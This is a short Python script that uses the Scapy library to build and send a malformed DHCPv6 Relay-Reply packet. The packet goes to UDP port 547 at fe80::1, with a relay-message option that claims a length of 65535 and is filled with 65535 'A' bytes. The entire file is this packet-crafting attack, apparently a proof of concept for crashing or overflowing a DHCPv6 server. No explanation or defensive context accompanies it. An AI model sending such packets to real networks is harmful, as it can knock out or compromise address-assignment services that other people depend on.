from scapy.all import *

pkt = (
    IPv6(dst="fe80::1") /
    UDP(sport=546, dport=547) /
    DHCP6_RelayReply(
        msgtype=13,
        hopcount=0,
        linkaddr='::1',
        peeraddr='::1',
        options=DHCP6OptRelayMsg(
            optlen=65535,
            relaymsg=b"A" * 65535
        )
    )
)

send(pkt)
